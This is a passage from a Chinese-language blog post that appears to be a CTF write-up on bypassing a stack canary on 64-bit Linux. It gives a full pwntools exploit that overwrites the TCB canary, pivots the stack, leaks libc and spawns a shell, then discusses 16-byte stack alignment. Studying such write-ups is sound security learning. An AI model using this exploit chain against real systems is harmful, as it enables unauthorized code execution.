class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os = &#x27;linux&#x27;</span><br><span class="line">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line"># [&#x27;CRITICAL&#x27;, &#x27;DEBUG&#x27;, &#x27;ERROR&#x27;, &#x27;INFO&#x27;, &#x27;NOTSET&#x27;, &#x27;WARN&#x27;, &#x27;WARNING&#x27;]</span><br><span class="line">context.log_level = &#x27;DEBUG&#x27;</span><br><span class="line"></span><br><span class="line">libc_path = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br><span class="line">bin_path = &#x27;./bs&#x27;</span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">binary = ELF(bin_path)</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;&#x27;</span></span><br><span class="line">port = 6666</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def debug(command=&#x27;&#x27;):</span><br><span class="line">    gdb.attach(p, command)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">    # debug(&#x27;b *0x4009E7\n&#x27;)</span><br><span class="line">    g = lambda x: next(binary.search(asm(x, os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;)))</span><br><span class="line">    pop_rdi = g(&#x27;pop rdi; ret&#x27;)</span><br><span class="line">    pop_rsi_pop = g(&#x27;pop rsi; pop r15; ret&#x27;)</span><br><span class="line">    leave = g(&#x27;leave; ret&#x27;)</span><br><span class="line">    ret = <span class="number">0x0000000000400287</span></span><br><span class="line">    <span class="built_in">log</span>.info(<span class="string">&quot;pop_rdi:     &quot;</span> + hex(pop_rdi))</span><br><span class="line">    <span class="built_in">log</span>.info(<span class="string">&quot;pop_rsi_pop: &quot;</span> + hex(pop_rsi_pop))</span><br><span class="line">    <span class="built_in">log</span>.info(<span class="string">&quot;leave:       &quot;</span> + hex(leave))</span><br><span class="line"></span><br><span class="line">    size = <span class="number">0x1850</span></span><br><span class="line">    p.sendlineafter(&#x27;send?\n&#x27;, str(size))</span><br><span class="line"></span><br><span class="line">    fakebuf = <span class="number">0x602f00</span></span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    payload += &#x27;A&#x27; * 0x1010</span><br><span class="line">    <span class="meta"># stack pivot #step 1</span></span><br><span class="line">    payload += p64(fakebuf)</span><br><span class="line">    # ROP1 - leak libc</span><br><span class="line">    payload += p64(pop_rdi)</span><br><span class="line">    payload += p64(binary.got[&#x27;puts&#x27;])</span><br><span class="line">    payload += p64(binary.plt[&#x27;puts&#x27;])</span><br><span class="line">    # ROP2 - read</span><br><span class="line">    payload += p64(pop_rdi)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(pop_rsi_pop)</span><br><span class="line">    payload += p64(fakebuf)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(binary.plt[&#x27;read&#x27;])</span><br><span class="line">    <span class="meta"># stack pivot #step 2</span></span><br><span class="line">    payload += p64(leave)</span><br><span class="line">    # Override TCB Canary</span><br><span class="line">    payload = payload.ljust(size, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">    <span class="meta">#print(<span class="meta-string">&quot;pid &quot;</span> + str(proc.pidof(p)))</span></span><br><span class="line">    #raw_input(<span class="string">&quot;attach me&quot;</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    <span class="meta">#print(<span class="meta-string">&quot;pid &quot;</span> + str(proc.pidof(p)))</span></span><br><span class="line">    #raw_input(<span class="string">&quot;attach me&quot;</span>)</span><br><span class="line">    p.recvuntil(&#x27;goodbye.\n&#x27;)</span><br><span class="line">    leak = p.recv(6)+&#x27;\x00\x00&#x27;</span><br><span class="line">    leak = u64(leak)</span><br><span class="line">    <span class="meta">#info(<span class="meta-string">&quot;libc.address is %#x&quot;</span>, libc.address)</span></span><br><span class="line">    <span class="meta">#print(<span class="meta-string">&quot;leak:&quot;</span>, leak)</span></span><br><span class="line">    #print(&quot;sym:&quot;, libc.symbols[&#x27;puts&#x27;])</span><br><span class="line">    libc.address = leak - libc.symbols[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">    <span class="meta">#print(<span class="meta-string">&quot;leak:&quot;</span>,leak)</span></span><br><span class="line">    #print(&quot;sym:&quot;,libc.symbols[&#x27;puts&#x27;])</span><br><span class="line">    info(<span class="string">&quot;libc.address is %#x&quot;</span>, libc.address)</span><br><span class="line">    bin_sh = libc.search(&#x27;/bin/sh&#x27;).next()</span><br><span class="line">    system = libc.sym[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">    <span class="meta">#payload = <span class="meta-string">&#x27;&#x27;</span></span></span><br><span class="line">    #payload += p64(0)</span><br><span class="line">    <span class="meta">#payload += p64((libc.address+0x4f3c2))</span></span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    payload += p64(0)</span><br><span class="line">    payload += p64(pop_rdi)</span><br><span class="line">    payload += p64(bin_sh)</span><br><span class="line">    payload += p64(ret)</span><br><span class="line">    payload += p64(system)</span><br><span class="line"></span><br><span class="line">    p.send(payload)</span><br><span class="line">    <span class="meta">#print (<span class="meta-string">&quot;pid &quot;</span> + str(proc.pidof(p)))</span></span><br><span class="line">    #raw_input(<span class="string">&quot;attach me&quot;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    <span class="function"><span class="keyword">if</span> <span class="title">len</span><span class="params">(sys.argv)</span> </span>== <span class="number">1</span>:</span><br><span class="line">        global p</span><br><span class="line">        p = process(executable=bin_path, argv=[bin_path])  # , env=&#123;&#x27;LD_PRELOAD&#x27;:libc_path&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(sys.argv[<span class="number">1</span>], <span class="keyword">int</span>(sys.argv[<span class="number">2</span>]))</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure>



<p>运行后如下：</p>
<p><img src="/image/bypass-Canary/pwn.png" alt="pwn"></p>
<p>可以看到，成功getshell</p>
<p>另外，对于上面所提到的rsp需要对齐16字节的问题，摘录一段NASM的原话如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">The stack pointer %rsp must be aligned to a 16-byte boundary before making a call. </span><br><span class="line">Fine, but the process of making a call pushes the return address (8 bytes) on the stack,so when a function gets control, %rsp is not aligned. </span><br><span class="line">You have to make that extra space yourself, by pushing something or subtracting 8 from %rsp.</span><br></pre></td></tr></table></figure>

<p>Linus在邮件中也提到</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">On Tue, Jan <span class="number">10</span>, <span class="number">2017</span> at <span class="number">7</span>:<span class="number">30</span> PM, Linus Torvalds</span><br><span class="line">&lt;torvalds@linux-foundation.org&gt; wrote:</span><br><span class="line">&gt;</span><br><span class="line">&gt; If you really want more <span class="built_in">stack</span> alignment, you have to generate that</span><br><span class="line">&gt; <span class="function">alignment yourself by <span class="title">hand</span> <span class="params">(<span class="keyword">and</span> have a bigger buffer that you <span class="keyword">do</span> that</span></span></span><br><span class="line">&gt; alignment inside).</span><br><span class="line"></span><br><span class="line">Side note: <span class="function">gcc <span class="title">can</span> <span class="params">(<span class="keyword">and</span> does)</span> actually generate forced alignment <span class="keyword">using</span></span></span><br><span class="line">&quot;and&quot; instructions on %rsp rather than assuming pre-existing</span><br><span class="line">alignment.  And that would be valid.</span><br><span class="line"></span><br><span class="line">The problem with <span class="string">&quot;alignof(16)&quot;</span> is <span class="keyword">not</span> that gcc couldn<span class="number">&#x27;</span>t generate the</span><br><span class="line">alignment itself, it<span class="number">&#x27;</span>s just the broken <span class="string">&quot;it&#x27;s already aligned to 16</span></span><br><span class="line"><span class="string">bytes&quot;</span> assumption because -mpreferred-<span class="built_in">stack</span>-boundary=<span class="number">3</span> doesn<span class="number">&#x27;</span>t work.</span><br><span class="line"></span><br><span class="line">You *could* <span class="keyword">try</span> to hack around it by forcing a <span class="number">32</span>-byte alignment</span><br><span class="line">instead. That (I think) will make gcc generate the <span class="string">&quot;and&quot;</span> instruction</span><br><span class="line">mess.</span><br><span class="line"></span><br><span class="line">And it shouldn<span class="number">&#x27;</span>t actually use any more memory than doing it by hand</span><br><span class="line">(by having twice the alignment <span class="keyword">and</span> hand-aligning the pointer).</span><br><span class="line"></span><br><span class="line">So we *could* <span class="keyword">try</span> to just have a really hacky rule saying that you can</span><br><span class="line">align <span class="built_in">stack</span> data to <span class="number">8</span> <span class="keyword">or</span> <span class="number">32</span> bytes, but *<span class="keyword">not</span>* to <span class="number">16</span> bytes.</span><br><span class="line"></span><br><span class="line">That said, I <span class="keyword">do</span> think that the <span class="string">&quot;don&#x27;t assume stack alignment, do it by</span></span><br><span class="line"><span class="string">hand&quot;</span> may be the safer thing. Because who knows what the random rules</span><br><span class="line">will be on other architectures.</span><br><span class="line"></span><br><span class="line">               Linus</span><br><span class="line">--</span><br></pre></td></tr></table></figure>



<p>由于没有调试kernel,所以我暂且把这里的call认为其包含syscall系统调用，所以在call函数之前，必须保证rsp对齐，否则就有可能出现不可预期的错误</p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>64位下的pwn还是有很多需要注意的点，另外后面会尝试进一步调试kernel，看看syscall 0x38后到底是哪里由于rsp没有对齐造成了异常退出(估计多半也是像movaps之类的指令hh，权当猜测)</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">ph4ntom</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://ph4ntonn.github.io/bypass-Canary.html">https://ph4ntonn.github.io/bypass-Canary.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://ph4ntonn.github.io" target="_blank">ph4ntom's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/binary/">binary</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/ret2dl.html"><img class="prev-cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">ret2dl</div></div></a></div><div class="next-post pull-right"><a href="/ptmalloc.html"><img class="next-cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">ptmalloc机制闲扯</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/Double-free.html" title="Double free"><img class="cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-10-23</div><div class="title">Double free</div></div></a></div><div><a href="/ptmalloc.html" title="ptmalloc机制闲扯"><img class="cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-10-24</div><div class="title">ptmalloc机制闲扯</div></div></a></div><div><a href="/ret2dl.html" title="ret2dl"><img class="cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-13</div><div class="title">ret2dl</div></div></a></div><div><a href="/partial-write.html" title="partial overwrite && stack smash"><img class="cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-27</div><div class="title">partial overwrite && stack smash</div></div></a></div><div><a href="/how-ptmalloc-malloc-free.html" title="how ptmalloc malloc && free"><img class="cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-12-04</div><div class="title">how ptmalloc malloc && free</div></div></a></div><div><a href="/CVE-2017-16995-exploit.html" title="CVE-2017-16995 -- 利用"><img class="cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-13</div><div class="title">CVE-2017-16995 -- 利用</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">ph4ntom</div><div class="author-info__description">The wheel turns,nothing is ever new</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">25</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ph4ntonn"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/ph4ntonn" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:ph4ntom11235@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客～</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83"><span class="toc-number">2.</span> <span class="toc-text">环境</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">3.</span> <span class="toc-text">解题</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WHY"><span class="toc-number">4.</span> <span class="toc-text">WHY?</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-number">5.</span> <span class="toc-text">结语</span></a></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/Why-U-S-10-Year-Treasury-Bond-Yield-matters.html" title="Why U.S. 10-Year Treasury Bond Yield matters"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Why U.S. 10-Year Treasury Bond Yield matters"/></a><div class="content"><a class="title" href="/Why-U-S-10-Year-Treasury-Bond-Yield-matters.html" title="Why U.S. 10-Year Treasury Bond Yield matters">Why U.S. 10-Year Treasury Bond Yield matters</a><time datetime="2021-02-26T06:15:43.000Z" title="发表于 2021-02-26 14:15:43">2021-02-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/user2kernel.html" title="user2kernel"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="user2kernel"/></a><div class="content"><a class="title" href="/user2kernel.html" title="user2kernel">user2kernel</a><time datetime="2021-01-25T03:43:10.000Z" title="发表于 2021-01-25 11:43:10">2021-01-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/tiny-knowledge.html" title="零碎的知识"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="零碎的知识"/></a><div class="content"><a class="title" href="/tiny-knowledge.html" title="零碎的知识">零碎的知识</a><time datetime="2021-01-22T09:49:54.000Z" title="发表于 2021-01-22 17:49:54">2021-01-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/linux-xid.html" title="linux内核中的xID"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="linux内核中的xID"/></a><div class="content"><a class="title" href="/linux-xid.html" title="linux内核中的xID">linux内核中的xID</a><time datetime="2021-01-21T04:06:13.000Z" title="发表于 2021-01-21 12:06:13">2021-01-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/CVE-2017-16995-structure.html" title="CVE-2017-16995 -- 结构"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CVE-2017-16995 -- 结构"/></a><div class="content"><a class="title" href="/CVE-2017-16995-structure.html" title="CVE-2017-16995 -- 结构">CVE-2017-16995 -- 结构</a><time datetime="2021-01-16T04:06:13.000Z" title="发表于 2021-01-16 12:06:13">2021-01-16</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2021 By ph4ntom</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',()=> {preloader.endLoading()})</script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    let initData = {
      el: '#vcomment',
      appId: '9E1TK8SCjpPaeeW41wldJbk1-gzGzoHsz',
      appKey: 'HyvuhJHOsDtafuWIxYSzbLXH',
      placeholder: 'xor ebx,ebx;push 0xdeadbeef;mov ecx,[esp];mov edx,0x400;mov al,0x03;int 0x80',
      avatar: 'monsterid',
      meta: 'nick,mail,link'.split(','),
      pageSize: '10',
      lang: 'zh-CN',
      recordIP: false,
      serverURLs: '',
      emojiCDN: '//i0.hdslb.com/bfs/emote/',
      emojiMaps: {"tv_doge":"6ea59c827c414b4a2955fe79e0f6fd3dcd515e24.png","tv_親親":"a8111ad55953ef5e3be3327ef94eb4a39d535d06.png","tv_偷笑":"bb690d4107620f1c15cff29509db529a73aee261.png","tv_再見":"180129b8ea851044ce71caf55cc8ce44bd4a4fc8.png","tv_冷漠":"b9cbc755c2b3ee43be07ca13de84e5b699a3f101.png","tv_發怒":"34ba3cd204d5b05fec70ce08fa9fa0dd612409ff.png","tv_發財":"34db290afd2963723c6eb3c4560667db7253a21a.png","tv_可愛":"9e55fd9b500ac4b96613539f1ce2f9499e314ed9.png","tv_吐血":"09dd16a7aa59b77baa1155d47484409624470c77.png","tv_呆":"fe1179ebaa191569b0d31cecafe7a2cd1c951c9d.png","tv_嘔吐":"9f996894a39e282ccf5e66856af49483f81870f3.png","tv_困":"241ee304e44c0af029adceb294399391e4737ef2.png","tv_壞笑":"1f0b87f731a671079842116e0991c91c2c88645a.png","tv_大佬":"093c1e2c490161aca397afc45573c877cdead616.png","tv_大哭":"23269aeb35f99daee28dda129676f6e9ea87934f.png","tv_委屈":"d04dba7b5465779e9755d2ab6f0a897b9b33bb77.png","tv_害羞":"a37683fb5642fa3ddfc7f4e5525fd13e42a2bdb1.png","tv_尷尬":"7cfa62dafc59798a3d3fb262d421eeeff166cfa4.png","tv_微笑":"70dc5c7b56f93eb61bddba11e28fb1d18fddcd4c.png","tv_思考":"90cf159733e558137ed20aa04d09964436f618a1.png","tv_驚嚇":"0d15c7e2ee58e935adc6a7193ee042388adc22af.png"},
      enableQQ: false,
      path: window.location.pathname,
    }

    if (true) { 
      initData.requiredFields= ('nick,mail'.split(','))
    }
    
    if (false) {
      const otherData = false
      initData = Object.assign({}, initData, otherData)
    }
    
    const valine = new Valine(initData)
  }

  if (typeof Valine === 'function') initValine() 
  else $.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js', initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.querySelector('#vcomment'),loadValine)
  else setTimeout(() => loadValine(), 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>